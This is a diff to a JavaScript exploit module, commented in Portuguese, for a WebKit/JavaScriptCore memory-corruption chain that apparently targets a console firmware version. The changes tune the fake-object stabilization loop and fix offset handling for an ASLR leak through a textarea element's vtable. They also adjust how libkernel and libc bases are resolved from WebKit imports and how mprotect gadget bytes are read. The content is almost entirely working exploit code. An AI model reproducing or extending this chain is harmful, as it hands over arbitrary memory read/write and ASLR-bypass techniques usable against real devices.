@@ -34,7 +34,7 @@ import {
     resolve_import, // Importa resolve_import
     get_view_vector // Importa get_view_vector
 } from '../module/memtools.mjs';
-import * as off from '../module/offset.mjs'; // Importa todos os offsets
+// A importação de 'offset.mjs' foi removida pois os offsets estão agora em 'config.mjs'
 
 export const FNAME_MODULE = "v22 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
 
@@ -70,7 +70,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         for (let j = 0; j < bytesPerRow; j++) {
             if (i + j < size) {
                 try {
-                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
+                    const byte = await arbReadFn(address.add(i + j), 1);
                     rowBytes.push(byte);
                     hexLine += byte.toString(16).padStart(2, '0') + " ";
                     asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
@@ -272,8 +272,9 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
 
     initializeCorePrimitives(); // Garante que confusedFloat64Array e victimArray existam
 
-    // AUMENTAR TENTATIVAS DE ESTABILIZAÇÃO PARA DEPURACAO
-    const NUM_STABILIZATION_ATTEMPTS = 100; // Aumentado de 5 para 100
+    // AUMENTADO O NÚMERO DE TENTATIVAS PARA MAIOR ROBUSTEZ.
+    // ESTE VALOR PODE PRECISAR DE AJUSTE FINO PARA A FW 12.02.
+    const NUM_STABILIZATION_ATTEMPTS = 200;
     const GC_INTERVAL_ATTEMPTS = 5; // A cada 5 tentativas, força um GC
 
     for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
@@ -372,9 +373,6 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
                 }
             } else {
                 logFn(`[${FNAME}] ALERTA: test_obj_val não é um objeto ou array comum para teste de R/W. Tipo: ${typeof test_obj_val}.`, "warn", FNAME);
-                // Se não for um tipo testável de forma simples, podemos tentar verificar a validade do objeto forjado
-                // usando algo como Object.keys ou Object.getOwnPropertyNames.
-                // MAS CUIDADO: Operações em objetos falsificados podem levar a crashes se a structure estiver muito corrompida.
                 try {
                     const keys = Object.keys(faked_obj);
                     logFn(`[${FNAME}] DEBUG: faked_obj tem ${keys.length} chaves: ${keys.join(',')}.`, "debug", FNAME);
@@ -508,7 +506,7 @@ export async function executeExploitChain(logFn, pauseFn) {
 
         const textarea_elem = document.createElement('textarea');
         heldObjects.push(textarea_elem);
-        const webcore_textarea_addr = kernelMemory.addrof(textarea_elem).add(JSC_OFFSETS.JSObject.jsta_impl);
+        const webcore_textarea_addr = kernelMemory.addrof(textarea_elem).add(JSC_OFFSETS.JSObject.JSTA_IMPL_OFFSET);
         textAreaVTableAddr = kernelMemory.readp(webcore_textarea_addr.add(0));
 
         logFn(`[ASLR LEAK] Vtable da HTMLTextAreaElement vazada: ${textAreaVTableAddr.toString(true)}`, "leak");
@@ -528,12 +526,12 @@ export async function executeExploitChain(logFn, pauseFn) {
             throw new Error(errMsg);
         }
 
-        const stack_chk_fail_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_stack_chk_fail);
+        const stack_chk_fail_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(parseInt(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_stack_chk_fail, 16));
         const stack_chk_fail_resolved_addr = resolve_import(stack_chk_fail_import_addr);
         libKernelBase = find_base(stack_chk_fail_resolved_addr, true, true);
         logFn(`[ASLR LEAK] Base da libkernel_web.sprx: ${libKernelBase.toString(true)}`, "leak");
 
-        const memcpy_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_memcpy);
+        const memcpy_import_addr = new Addr(libWebKitBase.lo, libWebKitBase.hi).add(parseInt(JSC_OFFSETS.WEBKIT_IMPORTS.offset_wk_memcpy, 16));
         const memcpy_resolved_addr = resolve_import(memcpy_import_addr);
         libCLibBase = find_base(memcpy_resolved_addr, true, true);
         logFn(`[ASLR LEAK] Base da libSceLibcInternal.sprx: ${libCLibBase.toString(true)}`, "leak");
@@ -608,7 +606,7 @@ export async function executeExploitChain(logFn, pauseFn) {
         const mprotect_first_bytes_check = await readArbitrary(mprotect_addr_check_as_addr, 4);
 
         if (mprotect_first_bytes_check instanceof Int && mprotect_first_bytes_check.lo !== 0 && mprotect_first_bytes_check.lo !== 0xFFFFFFFF) {
-            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check.lo)}. ASLR validado!`, "good");
         } else {
              logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
         }
@@ -670,7 +668,7 @@ export async function executeExploitChain(logFn, pauseFn) {
         const mprotect_first_bytes = await readUniversalJSHeap(mprotect_addr_real_as_addr, 4, logFn);
         logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}.`, "leak");
         if (mprotect_first_bytes instanceof Int && mprotect_first_bytes.lo !== 0 && mprotect_first_bytes.lo !== 0xFFFFFFFF) {
-            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes.lo)}. ASLR validado!`, "good");
         } else {
              logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
         }
